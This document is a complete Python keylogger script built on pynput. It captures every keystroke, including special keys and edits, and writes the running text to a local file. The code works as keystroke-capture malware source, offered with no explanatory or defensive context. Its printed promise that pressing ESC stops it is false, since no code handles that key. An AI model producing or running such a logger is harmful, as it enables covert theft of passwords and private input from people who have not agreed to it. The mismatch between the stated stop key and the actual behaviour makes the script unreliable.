from pynput import keyboard
import os

log_file = "key_log.txt"

print("Keylogger started. Press ESC to stop.")

# Create the file if it doesn't exist
if not os.path.exists(log_file):
    with open(log_file, "w") as f:
        f.write("")

# Initialize log as a list of characters
log = []

def on_press(key):
    global log

    try:
        if key == keyboard.Key.backspace:
            if log:
                log.pop()  # Remove the last character
        elif key == keyboard.Key.space:
            log.append(" ")
        elif key == keyboard.Key.enter:
            log.append("\n")
        elif hasattr(key, 'char') and key.char is not None:
            log.append(key.char)
        else:
            log.append(f"[{key.name}]")  # Handle special keys
    except Exception as e:
        log.append(f"[Error:{str(e)}]")

    with open(log_file, "w") as f:
        f.write("".join(log))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
